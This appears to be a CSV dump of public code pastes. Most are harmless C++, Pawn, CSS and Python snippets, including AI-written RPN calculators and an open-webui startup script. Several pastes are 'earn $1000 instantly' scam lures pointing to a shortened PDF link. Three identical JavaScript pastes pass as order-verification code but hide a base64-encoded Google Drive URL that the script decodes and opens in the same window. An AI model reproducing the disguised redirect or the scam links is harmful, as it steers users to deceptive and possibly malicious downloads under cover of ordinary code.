id,title,username,language,date,content
Yj44gVzs,Untitled,Mikhail-Podbolotov,C++,Thursday 17th of April 2025 07:06:33 AM CDT,"//// deepseek 
#include <iostream>

// Шаблонный класс Stack
template <typename T>
class Stack {
private:
    struct Node {
        T data;
        Node* next;
        Node(const T& data, Node* next = nullptr) : data(data), next(next) {}
    };

    Node* topNode;
    size_t stackSize;

public:
    Stack() : topNode(nullptr), stackSize(0) {}

    ~Stack() {
        while (!empty()) {
            pop();
        }
    }

    void push(const T& value) {
        Node* newNode = new Node(value, topNode);
        topNode = newNode;
        stackSize++;
    }

    void pop() {
        if (empty()) {
            std::cerr << ""Error: Stack is empty, cannot pop\n"";
            return;
        }

        Node* temp = topNode;
        topNode = topNode->next;
        delete temp;
        stackSize--;
    }

    T& top() {
        if (empty()) {
            std::cerr << ""Error: Stack is empty, returning garbage value\n"";
            static T garbage;
            return garbage;
        }
        return topNode->data;
    }

    const T& top() const {
        if (empty()) {
            std::cerr << ""Error: Stack is empty, returning garbage value\n"";
            static T garbage;
            return garbage;
        }
        return topNode->data;
    }

    bool empty() const {
        return topNode == nullptr;
    }

    size_t size() const {
        return stackSize;
    }
};

// Вспомогательные функции для калькулятора
bool isDigit(char c) {
    return c >= '0' && c <= '9';
}

double parseNumber(const char*& str) {
    double num = 0;
    bool negative = false;
    bool decimal = false;
    double decimalDivisor = 1.0;

    if (*str == '-') {
        negative = true;
        ++str;
    }

    while (isDigit(*str) || *str == '.') {
        if (*str == '.') {
            decimal = true;
            ++str;
            continue;
        }

        if (decimal) {
            decimalDivisor *= 10;
            num += (*str - '0') / decimalDivisor;
        }
        else {
            num = num * 10 + (*str - '0');
        }
        ++str;
    }

    return negative ? -num : num;
}

// Функция вычисления выражения в ОПН
double evaluateRPN(const char* expression) {
    Stack<double> stack;

    while (*expression != '\0') {
        // Пропускаем пробелы
        if (*expression == ' ') {
            ++expression;
            continue;
        }

        // Если цифра или минус (начало числа)
        if (isDigit(*expression) || (*expression == '-' && isDigit(*(expression + 1)))) {
            stack.push(parseNumber(expression));
        }
        else {
            // Операция
            if (stack.size() < 2) {
                std::cerr << ""Error: Not enough operands for operation\n"";
                return 0;
            }

            double b = stack.top(); stack.pop();
            double a = stack.top(); stack.pop();

            switch (*expression) {
            case '+': stack.push(a + b); break;
            case '-': stack.push(a - b); break;
            case '*': stack.push(a * b); break;
            case '/':
                if (b == 0) {
                    std::cerr << ""Error: Division by zero\n"";
                    return 0;
                }
                stack.push(a / b);
                break;
            default:
                std::cerr << ""Error: Unknown operator '"" << *expression << ""'\n"";
                return 0;
            }
            ++expression;
        }
    }

    if (stack.size() != 1) {
        std::cerr << ""Error: Invalid expression format\n"";
        return 0;
    }

    return stack.top();
}

// Тестирование стека
void testStack() {
    std::cout << ""=== Testing Stack ===\n"";
    Stack<int> s;

    s.push(1);
    s.push(2);
    s.push(3);

    std::cout << ""Top: "" << s.top() << "" (expected 3)\n"";
    s.pop();
    std::cout << ""Top after pop: "" << s.top() << "" (expected 2)\n"";
    std::cout << ""Size: "" << s.size() << "" (expected 2)\n"";
    std::cout << ""Empty: "" << (s.empty() ? ""true"" : ""false"") << "" (expected false)\n"";

    s.pop();
    s.pop();
    std::cout << ""Empty after pops: "" << (s.empty() ? ""true"" : ""false"") << "" (expected true)\n"";

    // Тест на пустом стеке
    s.top(); // Должно вывести ошибку
    s.pop(); // Должно вывести ошибку
}

// Тестирование калькулятора
void testCalculator() {
    std::cout << ""\n=== Testing RPN Calculator ===\n"";

    const char* test1 = ""3 4 +""; // 3 + 4 = 7
    const char* test2 = ""5 1 2 + 4 * +""; // 5 + (1 + 2) * 4 = 17
    const char* test3 = ""10 6 - 2 /""; // (10 - 6) / 2 = 2
    const char* test4 = ""3.5 2 *""; // 3.5 * 2 = 7
    const char* test5 = ""-5 3 +""; // -5 + 3 = -2

    std::cout << test1 << "" = "" << evaluateRPN(test1) << "" (expected 7)\n"";
    std::cout << test2 << "" = "" << evaluateRPN(test2) << "" (expected 17)\n"";
    std::cout << test3 << "" = "" << evaluateRPN(test3) << "" (expected 2)\n"";
    std::cout << test4 << "" = "" << evaluateRPN(test4) << "" (expected 7)\n"";
    std::cout << test5 << "" = "" << evaluateRPN(test5) << "" (expected -2)\n"";

    // Тест ошибок
    std::cout << ""\nTesting errors:\n"";
    evaluateRPN(""1 2 + +""); // Недостаточно операндов
    evaluateRPN(""1 0 /"");   // Деление на ноль
    evaluateRPN(""1 2 &"");   // Неизвестный оператор
}

int main() {
    testStack();
    testCalculator();

    // Интерактивный режим
    std::cout << ""\n=== Interactive RPN Calculator ===\n"";
    std::cout << ""Enter expression (e.g. '3 4 + 2 *'), 'q' to quit\n"";

    char input[256];
    while (true) {
        std::cout << ""> "";
        std::cin.getline(input, sizeof(input));

        if (input[0] == 'q') break;

        double result = evaluateRPN(input);
        std::cout << ""= "" << result << ""\n"";
    }

    return 0;
}"
1BiTbEjL,Untitled,Mikhail-Podbolotov,C++,Thursday 17th of April 2025 07:05:41 AM CDT,"//chatgpt

#include <iostream>
#include <string>

template <typename T>
class Stack {
private:
    struct Node {
        T data;
        Node* next;
        Node(const T& value, Node* nextNode = nullptr)
            : data(value), next(nextNode) {}
    };

    Node* topNode;

public:
    Stack() : topNode(nullptr) {}

    ~Stack() {
        while (!isEmpty()) {
            pop();
        }
    }

    void push(const T& value) {
        topNode = new Node(value, topNode);
    }

    void pop() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty, cannot pop.\n"";
            return;
        }
        Node* temp = topNode;
        topNode = topNode->next;
        delete temp;
    }

    T& top() {
        if (isEmpty()) {
            std::cerr << ""Error: Stack is empty.\n"";
            std::exit(1);
        }
        return topNode->data;
    }

    bool isEmpty() const {
        return topNode == nullptr;
    }
};

// Простейшая проверка: является ли строка числом (включая отрицательные)
bool isNumber(const std::string& s) {
    if (s.empty()) return false;
    size_t start = 0;
    if (s[0] == '-') {
        if (s.size() == 1) return false;
        start = 1;
    }
    for (size_t i = start; i < s.size(); ++i) {
        if (s[i] < '0' || s[i] > '9') return false;
    }
    return true;
}

// Простейший stoi, без std::stoi
int toInt(const std::string& s) {
    int result = 0;
    bool negative = false;
    size_t i = 0;

    if (s[0] == '-') {
        negative = true;
        i = 1;
    }

    for (; i < s.size(); ++i) {
        result = result * 10 + (s[i] - '0');
    }

    return negative ? -result : result;
}

void evaluateRPN(const std::string& input) {
    Stack<int> stack;
    std::string token = """";

    for (size_t i = 0; i <= input.length(); ++i) {
        char ch = (i < input.length()) ? input[i] : ' ';

        if (ch != ' ') {
            token += ch;
        } else if (!token.empty()) {
            if (isNumber(token)) {
                stack.push(toInt(token));
            } else if (token == ""+"" || token == ""-"" || token == ""*"" || token == ""/"") {
                if (stack.isEmpty()) { std::cerr << ""Not enough operands\n""; return; }
                int b = stack.top(); stack.pop();

                if (stack.isEmpty()) { std::cerr << ""Not enough operands\n""; return; }
                int a = stack.top(); stack.pop();

                if (token == ""+"") stack.push(a + b);
                else if (token == ""-"") stack.push(a - b);
                else if (token == ""*"") stack.push(a * b);
                else if (token == ""/"") stack.push(a / b); // Без проверки деления на 0 для простоты
            } else {
                std::cerr << ""Unknown token: "" << token << ""\n"";
                return;
            }
            token = """";
        }
    }

    if (!stack.isEmpty()) {
        std::cout << ""Result: "" << stack.top() << ""\n"";
    } else {
        std::cerr << ""No result on stack\n"";
    }
}

int main() {
    std::string input;
    std::cout << ""Enter RPN expression (e.g. '3 4 + 2 *'): "";
    std::getline(std::cin, input);

    evaluateRPN(input);

    return 0;
}
"
QfBWJEvz,Binary_Index_Tree,Araf_12,C++,Thursday 17th of April 2025 07:05:12 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int MAXINDEX = 100005;
int tree[MAXINDEX]; // BIT array

// Point update for BIT (add val to index idx)
void update(int idx, int val) {
    while (idx < MAXINDEX) {
        tree[idx] += val;
        idx += (idx & -idx);
    }
}

// Range update: add val to range [l, r]
void range_update(int l, int r, int val) {
    update(l, val);       // Add val at start
    update(r + 1, -val);  // Remove val after end
}

// Point query: get value at index idx
int point_query(int idx) {
    int res = 0;
    while (idx > 0) {
        res += tree[idx];
        idx -= (idx & -idx);
    }
    return res;
}

// Example usage
int main() {
    // Range updates
    range_update(2, 5, 10);  // add 10 to all elements in [2, 5]
    range_update(4, 7, 5);   // add 5 to all elements in [4, 7]

    // Point queries
    cout << ""Value at index 3: "" << point_query(3) << endl;  // should print 10
    cout << ""Value at index 5: "" << point_query(5) << endl;  // should print 15
    cout << ""Value at index 7: "" << point_query(7) << endl;  // should print 5
    cout << ""Value at index 1: "" << point_query(1) << endl;  // should print 0

    return 0;
}
"
vaysecgd,Make $1000 15-MINUTES  (BEGINNER) HV,DHGDTRFGETFRE6,JavaScript,Thursday 17th of April 2025 07:03:49 AM CDT," 
Pdf https://tinyurl.com/privguidee


sd8rkr1SiS
"
xzwD0TAg,Market.js,dentira,JavaScript,Thursday 17th of April 2025 07:01:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46225/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RbnV8zUz,EARN $900 INSTANTLY 2025 2U,DHGDTRFGETFRE6,JavaScript,Thursday 17th of April 2025 06:50:26 AM CDT," 
Pdf https://tinyurl.com/privguidee


kuioezeITw
"
rT63GkGT,Untitled,dentira,JavaScript,Thursday 17th of April 2025 06:46:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37583/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1mQj8UcB,Skin changer for Stars And Stripes Multtiplayer.,Joey_Simmons,Pawn,Thursday 17th of April 2025 06:41:38 AM CDT,"#include <a_samp>
#include <zcmd>
#include <sscanf2>

CMD:skin(playerid, params[])
{
    if(!IsPlayerAdmin(playerid))
    {
        SendClientMessage(playerid, 0xFF0000FF, ""Error: You must be an RCON admin to use this command!"");
        return 1;
    }

    new skinid;
    if(sscanf(params, ""i"", skinid))
    {
        SendClientMessage(playerid, 0xFFFF00FF, ""Usage: /skin [skin_id]"");
        SendClientMessage(playerid, 0xFFFF00FF, ""Valid IDs: 11754-12799, 13891-14257"");
        return 1;
    }

    new bool:isValid = (skinid >= 11754 && skinid <= 12799) || (skinid >= 13891 && skinid <= 14257);
    switch(isValid)
    {
        case true:
        {
            SetPlayerSkin(playerid, skinid);
            new string[128];
            format(string, sizeof(string), ""You have changed your skin to ID %d."", skinid);
            SendClientMessage(playerid, 0x00FF00FF, string);
        }
        case false:
        {
            SendClientMessage(playerid, 0xFF0000FF, ""Error: Invalid skin ID! Valid IDs: 11754-12799, 13891-14257"");
        }
    }

    return 1;
}"
EyUSZNLG,Make $1000 15-MINUTES  (BEGINNER) HV,OffbrandShrek,JavaScript,Thursday 17th of April 2025 06:36:39 AM CDT," 
Pdf https://tinyurl.com/privguidee


n8sH5W4BzL
"
xhT9YYt2,Weapons in Stars And Stripes Multiplayer.,Joey_Simmons,Pawn,Thursday 17th of April 2025 06:33:56 AM CDT,"#include <a_samp>
#include <sscanf2>
#include <zcmd>

CMD:weapon(playerid, params[])
{
    if(!IsPlayerAdmin(playerid))
    {
        SendClientMessage(playerid, 0xFF0000FF, ""Error: You must be an RCON admin to use this command!"");
        return 1;
    }

    new weaponid;
    if(sscanf(params, ""i"", weaponid))
    {
        SendClientMessage(playerid, 0xFFFF00FF, ""Usage: /weapon [weapon_id]"");
        SendClientMessage(playerid, 0xFFFF00FF, ""Valid IDs: 70-92, 99-175"");
        return 1;
    }

    new bool:isValid = (weaponid >= 70 && weaponid <= 92) || (weaponid >= 99 && weaponid <= 175);
    switch(isValid)
    {
        case true:
        {
            GivePlayerWeapon(playerid, weaponid, 100);
            new string[128];
            format(string, sizeof(string), ""You have received weapon ID %d."", weaponid);
            SendClientMessage(playerid, 0x00FF00FF, string);
        }
        case false:
        {
            SendClientMessage(playerid, 0xFF0000FF, ""Error: Invalid weapon ID! Valid IDs: 70-92, 99-175"");
        }
    }

    return 1;
}"
ZJFHb58c,styles.css,tool684,CSS,Thursday 17th of April 2025 06:32:02 AM CDT,"body {
    font-family: Arial, sans-serif;
    margin: 20px;
}

h1 {
    text-align: center;
}

.filters {
    margin-bottom: 20px;
}

.filters label {
    margin-right: 10px;
}

.filters input {
    margin-right: 10px;
    padding: 5px;
}

.filters button {
    padding: 5px 10px;
}

.upload {
    margin-bottom: 20px;
}

table {
    width: 100%;
    border-collapse: collapse;
}

th, td {
    border: 1px solid #ddd;
    padding: 8px;
    text-align: left;
}

th {
    background-color: #f2f2f2;
}

tr:nth-child(even) {
    background-color: #f9f9f9;
}"
eUW3hz1j,Products.js,dentira,JavaScript,Thursday 17th of April 2025 06:30:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79740/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
295sHMrg,EARN $900 INSTANTLY 2025 2U,OffbrandShrek,JavaScript,Thursday 17th of April 2025 06:23:15 AM CDT," 
Pdf https://tinyurl.com/privguidee


BZVlTQQPMa
"
k4qeDun6,webui main python script  modified,Ra7eN,Python,Thursday 17th of April 2025 06:16:40 AM CDT,"## WIP. Creating a persistant memory with personality project
## 4/17/25 FIXED SAVES TO SQLLITE3 NOW.
import asyncio
import inspect
import json
import logging
import mimetypes
import os
import shutil
import sys
import time
import random

from contextlib import asynccontextmanager
from urllib.parse import urlencode, parse_qs, urlparse
from pydantic import BaseModel
from sqlalchemy import text

from typing import Optional
from aiocache import cached
import aiohttp
import requests


from fastapi import (
    Depends,
    FastAPI,
    File,
    Form,
    HTTPException,
    Request,
    UploadFile,
    status,
    applications,
    BackgroundTasks,
)

from fastapi.openapi.docs import get_swagger_ui_html

from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles

from starlette.exceptions import HTTPException as StarletteHTTPException
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.middleware.sessions import SessionMiddleware
from starlette.responses import Response, StreamingResponse


from open_webui.utils import logger
from open_webui.utils.audit import AuditLevel, AuditLoggingMiddleware
from open_webui.utils.logger import start_logger
from open_webui.socket.main import (
    app as socket_app,
    periodic_usage_pool_cleanup,
)
from open_webui.routers import (
    audio,
    images,
    ollama,
    openai,
    retrieval,
    pipelines,
    tasks,
    auths,
    channels,
    chats,
    folders,
    configs,
    groups,
    files,
    functions,
    memories,
    models,
    knowledge,
    prompts,
    evaluations,
    tools,
    users,
    utils,
)

from open_webui.routers.retrieval import (
    get_embedding_function,
    get_ef,
    get_rf,
)

from open_webui.internal.db import Session, engine

from open_webui.models.functions import Functions
from open_webui.models.models import Models
from open_webui.models.users import UserModel, Users
from open_webui.models.chats import Chats

from open_webui.config import (
    LICENSE_KEY,
    # Ollama
    ENABLE_OLLAMA_API,
    OLLAMA_BASE_URLS,
    OLLAMA_API_CONFIGS,
    # OpenAI
    ENABLE_OPENAI_API,
    ONEDRIVE_CLIENT_ID,
    OPENAI_API_BASE_URLS,
    OPENAI_API_KEYS,
    OPENAI_API_CONFIGS,
    # Direct Connections
    ENABLE_DIRECT_CONNECTIONS,
    # Tool Server Configs
    TOOL_SERVER_CONNECTIONS,
    # Code Execution
    ENABLE_CODE_EXECUTION,
    CODE_EXECUTION_ENGINE,
    CODE_EXECUTION_JUPYTER_URL,
    CODE_EXECUTION_JUPYTER_AUTH,
    CODE_EXECUTION_JUPYTER_AUTH_TOKEN,
    CODE_EXECUTION_JUPYTER_AUTH_PASSWORD,
    CODE_EXECUTION_JUPYTER_TIMEOUT,
    ENABLE_CODE_INTERPRETER,
    CODE_INTERPRETER_ENGINE,
    CODE_INTERPRETER_PROMPT_TEMPLATE,
    CODE_INTERPRETER_JUPYTER_URL,
    CODE_INTERPRETER_JUPYTER_AUTH,
    CODE_INTERPRETER_JUPYTER_AUTH_TOKEN,
    CODE_INTERPRETER_JUPYTER_AUTH_PASSWORD,
    CODE_INTERPRETER_JUPYTER_TIMEOUT,
    # Image
    AUTOMATIC1111_API_AUTH,
    AUTOMATIC1111_BASE_URL,
    AUTOMATIC1111_CFG_SCALE,
    AUTOMATIC1111_SAMPLER,
    AUTOMATIC1111_SCHEDULER,
    COMFYUI_BASE_URL,
    COMFYUI_API_KEY,
    COMFYUI_WORKFLOW,
    COMFYUI_WORKFLOW_NODES,
    ENABLE_IMAGE_GENERATION,
    ENABLE_IMAGE_PROMPT_GENERATION,
    IMAGE_GENERATION_ENGINE,
    IMAGE_GENERATION_MODEL,
    IMAGE_SIZE,
    IMAGE_STEPS,
    IMAGES_OPENAI_API_BASE_URL,
    IMAGES_OPENAI_API_KEY,
    IMAGES_GEMINI_API_BASE_URL,
    IMAGES_GEMINI_API_KEY,
    # Audio
    AUDIO_STT_ENGINE,
    AUDIO_STT_MODEL,
    AUDIO_STT_OPENAI_API_BASE_URL,
    AUDIO_STT_OPENAI_API_KEY,
    AUDIO_STT_AZURE_API_KEY,
    AUDIO_STT_AZURE_REGION,
    AUDIO_STT_AZURE_LOCALES,
    AUDIO_TTS_API_KEY,
    AUDIO_TTS_ENGINE,
    AUDIO_TTS_MODEL,
    AUDIO_TTS_OPENAI_API_BASE_URL,
    AUDIO_TTS_OPENAI_API_KEY,
    AUDIO_TTS_SPLIT_ON,
    AUDIO_TTS_VOICE,
    AUDIO_TTS_AZURE_SPEECH_REGION,
    AUDIO_TTS_AZURE_SPEECH_OUTPUT_FORMAT,
    PLAYWRIGHT_WS_URL,
    PLAYWRIGHT_TIMEOUT,
    FIRECRAWL_API_BASE_URL,
    FIRECRAWL_API_KEY,
    WEB_LOADER_ENGINE,
    WHISPER_MODEL,
    WHISPER_VAD_FILTER,
    DEEPGRAM_API_KEY,
    WHISPER_MODEL_AUTO_UPDATE,
    WHISPER_MODEL_DIR,
    # Retrieval
    RAG_TEMPLATE,
    DEFAULT_RAG_TEMPLATE,
    RAG_FULL_CONTEXT,
    BYPASS_EMBEDDING_AND_RETRIEVAL,
    RAG_EMBEDDING_MODEL,
    RAG_EMBEDDING_MODEL_AUTO_UPDATE,
    RAG_EMBEDDING_MODEL_TRUST_REMOTE_CODE,
    RAG_RERANKING_MODEL,
    RAG_RERANKING_MODEL_AUTO_UPDATE,
    RAG_RERANKING_MODEL_TRUST_REMOTE_CODE,
    RAG_EMBEDDING_ENGINE,
    RAG_EMBEDDING_BATCH_SIZE,
    RAG_RELEVANCE_THRESHOLD,
    RAG_FILE_MAX_COUNT,
    RAG_FILE_MAX_SIZE,
    RAG_OPENAI_API_BASE_URL,
    RAG_OPENAI_API_KEY,
    RAG_OLLAMA_BASE_URL,
    RAG_OLLAMA_API_KEY,
    CHUNK_OVERLAP,
    CHUNK_SIZE,
    CONTENT_EXTRACTION_ENGINE,
    TIKA_SERVER_URL,
    DOCLING_SERVER_URL,
    DOCUMENT_INTELLIGENCE_ENDPOINT,
    DOCUMENT_INTELLIGENCE_KEY,
    MISTRAL_OCR_API_KEY,
    RAG_TOP_K,
    RAG_TOP_K_RERANKER,
    RAG_TEXT_SPLITTER,
    TIKTOKEN_ENCODING_NAME,
    PDF_EXTRACT_IMAGES,
    YOUTUBE_LOADER_LANGUAGE,
    YOUTUBE_LOADER_PROXY_URL,
    # Retrieval (Web Search)
    ENABLE_WEB_SEARCH,
    WEB_SEARCH_ENGINE,
    BYPASS_WEB_SEARCH_EMBEDDING_AND_RETRIEVAL,
    WEB_SEARCH_RESULT_COUNT,
    WEB_SEARCH_CONCURRENT_REQUESTS,
    WEB_SEARCH_TRUST_ENV,
    WEB_SEARCH_DOMAIN_FILTER_LIST,
    JINA_API_KEY,
    SEARCHAPI_API_KEY,
    SEARCHAPI_ENGINE,
    SERPAPI_API_KEY,
    SERPAPI_ENGINE,
    SEARXNG_QUERY_URL,
    SERPER_API_KEY,
    SERPLY_API_KEY,
    SERPSTACK_API_KEY,
    SERPSTACK_HTTPS,
    TAVILY_API_KEY,
    TAVILY_EXTRACT_DEPTH,
    BING_SEARCH_V7_ENDPOINT,
    BING_SEARCH_V7_SUBSCRIPTION_KEY,
    BRAVE_SEARCH_API_KEY,
    EXA_API_KEY,
    PERPLEXITY_API_KEY,
    SOUGOU_API_SID,
    SOUGOU_API_SK,
    KAGI_SEARCH_API_KEY,
    MOJEEK_SEARCH_API_KEY,
    BOCHA_SEARCH_API_KEY,
    GOOGLE_PSE_API_KEY,
    GOOGLE_PSE_ENGINE_ID,
    GOOGLE_DRIVE_CLIENT_ID,
    GOOGLE_DRIVE_API_KEY,
    ONEDRIVE_CLIENT_ID,
    ENABLE_RAG_HYBRID_SEARCH,
    ENABLE_RAG_LOCAL_WEB_FETCH,
    ENABLE_WEB_LOADER_SSL_VERIFICATION,
    ENABLE_GOOGLE_DRIVE_INTEGRATION,
    ENABLE_ONEDRIVE_INTEGRATION,
    UPLOAD_DIR,
    # WebUI
    WEBUI_AUTH,
    WEBUI_NAME,
    WEBUI_BANNERS,
    WEBHOOK_URL,
    ADMIN_EMAIL,
    SHOW_ADMIN_DETAILS,
    JWT_EXPIRES_IN,
    ENABLE_SIGNUP,
    ENABLE_LOGIN_FORM,
    ENABLE_API_KEY,
    ENABLE_API_KEY_ENDPOINT_RESTRICTIONS,
    API_KEY_ALLOWED_ENDPOINTS,
    ENABLE_CHANNELS,
    ENABLE_COMMUNITY_SHARING,
    ENABLE_MESSAGE_RATING,
    ENABLE_USER_WEBHOOKS,
    ENABLE_EVALUATION_ARENA_MODELS,
    USER_PERMISSIONS,
    DEFAULT_USER_ROLE,
    DEFAULT_PROMPT_SUGGESTIONS,
    DEFAULT_MODELS,
    DEFAULT_ARENA_MODEL,
    MODEL_ORDER_LIST,
    EVALUATION_ARENA_MODELS,
    # WebUI (OAuth)
    ENABLE_OAUTH_ROLE_MANAGEMENT,
    OAUTH_ROLES_CLAIM,
    OAUTH_EMAIL_CLAIM,
    OAUTH_PICTURE_CLAIM,
    OAUTH_USERNAME_CLAIM,
    OAUTH_ALLOWED_ROLES,
    OAUTH_ADMIN_ROLES,
    # WebUI (LDAP)
    ENABLE_LDAP,
    LDAP_SERVER_LABEL,
    LDAP_SERVER_HOST,
    LDAP_SERVER_PORT,
    LDAP_ATTRIBUTE_FOR_MAIL,
    LDAP_ATTRIBUTE_FOR_USERNAME,
    LDAP_SEARCH_FILTERS,
    LDAP_SEARCH_BASE,
    LDAP_APP_DN,
    LDAP_APP_PASSWORD,
    LDAP_USE_TLS,
    LDAP_CA_CERT_FILE,
    LDAP_CIPHERS,
    # Misc
    ENV,
    CACHE_DIR,
    STATIC_DIR,
    FRONTEND_BUILD_DIR,
    CORS_ALLOW_ORIGIN,
    DEFAULT_LOCALE,
    OAUTH_PROVIDERS,
    WEBUI_URL,
    # Admin
    ENABLE_ADMIN_CHAT_ACCESS,
    ENABLE_ADMIN_EXPORT,
    # Tasks
    TASK_MODEL,
    TASK_MODEL_EXTERNAL,
    ENABLE_TAGS_GENERATION,
    ENABLE_TITLE_GENERATION,
    ENABLE_SEARCH_QUERY_GENERATION,
    ENABLE_RETRIEVAL_QUERY_GENERATION,
    ENABLE_AUTOCOMPLETE_GENERATION,
    TITLE_GENERATION_PROMPT_TEMPLATE,
    TAGS_GENERATION_PROMPT_TEMPLATE,
    IMAGE_PROMPT_GENERATION_PROMPT_TEMPLATE,
    TOOLS_FUNCTION_CALLING_PROMPT_TEMPLATE,
    QUERY_GENERATION_PROMPT_TEMPLATE,
    AUTOCOMPLETE_GENERATION_PROMPT_TEMPLATE,
    AUTOCOMPLETE_GENERATION_INPUT_MAX_LENGTH,
    AppConfig,
    reset_config,
)
from open_webui.env import (
    AUDIT_EXCLUDED_PATHS,
    AUDIT_LOG_LEVEL,
    CHANGELOG,
    REDIS_URL,
    REDIS_SENTINEL_HOSTS,
    REDIS_SENTINEL_PORT,
    GLOBAL_LOG_LEVEL,
    MAX_BODY_LOG_SIZE,
    SAFE_MODE,
    SRC_LOG_LEVELS,
    VERSION,
    WEBUI_BUILD_HASH,
    WEBUI_SECRET_KEY,
    WEBUI_SESSION_COOKIE_SAME_SITE,
    WEBUI_SESSION_COOKIE_SECURE,
    WEBUI_AUTH_TRUSTED_EMAIL_HEADER,
    WEBUI_AUTH_TRUSTED_NAME_HEADER,
    ENABLE_WEBSOCKET_SUPPORT,
    BYPASS_MODEL_ACCESS_CONTROL,
    RESET_CONFIG_ON_START,
    OFFLINE_MODE,
    ENABLE_OTEL,
    EXTERNAL_PWA_MANIFEST_URL,
)


from open_webui.utils.models import (
    get_all_models,
    get_all_base_models,
    check_model_access,
)
from open_webui.utils.chat import (
    generate_chat_completion as chat_completion_handler,
    chat_completed as chat_completed_handler,
    chat_action as chat_action_handler,
)
from open_webui.utils.middleware import process_chat_payload, process_chat_response
from open_webui.utils.access_control import has_access

from open_webui.utils.auth import (
    get_license_data,
    get_http_authorization_cred,
    decode_token,
    get_admin_user,
    get_verified_user,
)
from open_webui.utils.oauth import OAuthManager
from open_webui.utils.security_headers import SecurityHeadersMiddleware

from open_webui.tasks import (
    list_task_ids_by_chat_id,
    stop_task,
    list_tasks,
)  # Import from tasks.py

from open_webui.utils.redis import get_sentinels_from_env


if SAFE_MODE:
    print(""SAFE MODE ENABLED"")
    Functions.deactivate_all_functions()

logging.basicConfig(stream=sys.stdout, level=GLOBAL_LOG_LEVEL)
log = logging.getLogger(__name__)
log.setLevel(SRC_LOG_LEVELS[""MAIN""])


class SPAStaticFiles(StaticFiles):
    async def get_response(self, path: str, scope):
        try:
            return await super().get_response(path, scope)
        except (HTTPException, StarletteHTTPException) as ex:
            if ex.status_code == 404:
                if path.endswith("".js""):
                    # Return 404 for javascript files
                    raise ex
                else:
                    return await super().get_response(""index.html"", scope)
            else:
                raise ex


print(
    rf""""""
 ██████╗ ██████╗ ███████╗███╗   ██╗    ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██║    ██║██╔════╝██╔══██╗██║   ██║██║
██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██║███╗██║██╔══╝  ██╔══██╗██║   ██║██║
╚██████╔╝██║     ███████╗██║ ╚████║    ╚███╔███╔╝███████╗██████╔╝╚██████╔╝██║
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝     ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝


v{VERSION} - building the best open-source AI user interface.
{f""Commit: {WEBUI_BUILD_HASH}"" if WEBUI_BUILD_HASH != ""dev-build"" else """"}
https://github.com/open-webui/open-webui
""""""
)

# === Custom AI Config (external mods) ===
BASE_DIR = ""I:/myAI/data""
sys.path.insert(0, BASE_DIR)
#
